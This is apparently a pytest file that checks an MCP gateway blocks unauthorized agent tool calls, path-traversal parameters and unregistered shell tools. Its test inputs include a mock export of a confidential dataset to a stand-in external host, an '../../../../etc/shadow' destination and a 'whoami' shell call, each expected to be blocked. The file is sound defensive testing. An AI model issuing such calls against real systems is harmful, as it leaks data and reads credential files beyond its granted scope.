"""Experiment 2: MCP Runtime Validation (Phase 13.R3).

Validates Tool Boundary, Protocol Gateways, and Fail-Closed guarantees
on a Model Context Protocol (MCP) Client + Server + Gateway architecture.
"""

from __future__ import annotations

import uuid
from typing import Any, Dict, List
import pytest

from src.openagentsec.adapters.observation import ObservationResult, ObservationStatus
from src.openagentsec.models.enums import ObservabilityState
from src.openagentsec.oracle import DeterministicToolBoundaryOracle, EvidenceItem, OracleDecision
from src.openagentsec.reproduction import (
    BaselineIdentity,
    ReproductionAggregator,
    ReproductionRun,
    ReproductionStatus,
    compute_config_hash,
)
from tests.integration.planner.test_state_memory_security import _load_fixtures
from tests.integration.real_world.adapters.mcp_adapter_example import RealMCPAdapterExample


def test_real_mcp_case1_unauthorized_tool_boundary_reproduction() -> None:
    """Exp 2 Case 1: Unauthorized Tool Invocation intercepted at MCP Gateway with 5-run reproduction."""
    policy, objective, _ = _load_fixtures()
    oracle = DeterministicToolBoundaryOracle()
    adapter = RealMCPAdapterExample()

    # Dispatch illegal tool call attempting exfiltration
    res = adapter.dispatch_tool_call(
        tool_name="export_internal_docs",
        arguments={"destination": "https://external.leak.test", "dataset": "confidential_db"},
        caller_identity={"role": "user"},
    )

    # Verify physical block at MCP Gateway
    assert res["status"] == "blocked"
    assert len(adapter.gateway.actual_tool_executions) == 0  # Physical execution count = 0!
    assert len(adapter.gateway.authorization_check_receipts) >= 1
    assert adapter.gateway.authorization_check_receipts[-1]["decision"] == "BLOCK"

    # Evidence collection
    evidence_items = adapter.collect_evidence(step_id="STEP-01", run_id="RUN-MCP-EXP2")
    assert len(evidence_items) == 3
    assert any(e.evidence_type == "state_transition_trace" for e in evidence_items)
    assert any(e.evidence_type == "tool_execution_log" for e in evidence_items)
    assert any(e.evidence_type == "authorization_parameter_check_receipt" for e in evidence_items)

    obs = {
        "actual_tool_execution": ObservationResult(
            status=ObservationStatus.OBSERVED,
            value=adapter.gateway.actual_tool_executions,
            observability=ObservabilityState.OBSERVABLE,
            source="mcp_gateway_runtime",
        ),
        "tool_trace": ObservationResult(
            status=ObservationStatus.OBSERVED,
            value=adapter.gateway.actual_tool_executions,
            observability=ObservabilityState.OBSERVABLE,
            source="mcp_gateway_runtime",
        ),
        "runtime_state": ObservationResult(
            status=ObservationStatus.OBSERVED,
            value={"gateway_status": "blocked", "receipt": res["receipt"]},
            observability=ObservabilityState.OBSERVABLE,
            source="mcp_gateway_runtime",
        ),
        "model_response": ObservationResult(
            status=ObservationStatus.OBSERVED,
            value="Action blocked by MCP Gateway perimeter policy.",
            observability=ObservabilityState.OBSERVABLE,
            source="mcp_gateway_runtime",
        ),
    }

    # Oracle evaluation
    decision = oracle.evaluate(policy, objective, obs, evidence_items=evidence_items)
    assert decision.decision == OracleDecision.NO_CONFIRMED_DEVIATION

    # Statutory 5-Run Zero-Variance Reproduction
    cfg_hash = compute_config_hash({"tool": "export_internal_docs", "scenario": "MCP-UNAUTH-TOOL-001"})
    baseline = BaselineIdentity(
        policy_id=policy.policy_id,
        policy_version="1.0.0",
        objective_id=objective.objective_id,
        target_id="TARGET-MCP-RUNTIME-GATEWAY",
        target_version="1.0.0",
        scenario_id="MCP-UNAUTH-TOOL-001",
        oracle_id="ORACLE-DETERMINISTIC-TOOL-001",
        config_hash=cfg_hash,
    )

    repro_runs: List[ReproductionRun] = []
    for r_idx in range(1, 6):
        repro_runs.append(
            ReproductionRun(
                run_id=f"RUN-MCP-EXP2-{r_idx}",
                run_index=r_idx,
                baseline_hash=baseline.compute_baseline_hash(),
                oracle_decision=decision.decision,
                violated_invariants=[],
                deviation_present=False,
                deviation_severity="none",
                reason_codes=[],
                evidence_refs=[e.evidence_id for e in evidence_items],
                reset_verified_before=True,
                reset_verified_after=True,
                valid=True,
            )
        )

    summary = ReproductionAggregator.aggregate(repro_runs, requested_runs=5, baseline=baseline)
    assert summary.reproduction_status == ReproductionStatus.REPRODUCED
    assert summary.variance_detected is False
    assert summary.completed_runs == 5


def test_real_mcp_case2_parameter_scope_violation() -> None:
    """Exp 2 Case 2: Parameter Scope Violation (Path Traversal) blocked by MCP Gateway."""
    adapter = RealMCPAdapterExample()

    res = adapter.dispatch_tool_call(
        tool_name="export_internal_docs",
        arguments={"destination": "../../../../etc/shadow", "dataset": "core_secrets"},
    )
    assert res["status"] == "blocked"
    assert len(adapter.gateway.actual_tool_executions) == 0
    assert "Illegal destination parameter" in res["error"]


def test_real_mcp_case3_undeclared_tool_fail_closed() -> None:
    """Exp 2 Case 3: Undeclared tool call triggers strict Fail-Closed block."""
    adapter = RealMCPAdapterExample()

    res = adapter.dispatch_tool_call(
        tool_name="execute_system_shell",
        arguments={"cmd": "whoami"},
    )
    assert res["status"] == "blocked"
    assert len(adapter.gateway.actual_tool_executions) == 0
    assert "not registered" in res["error"]
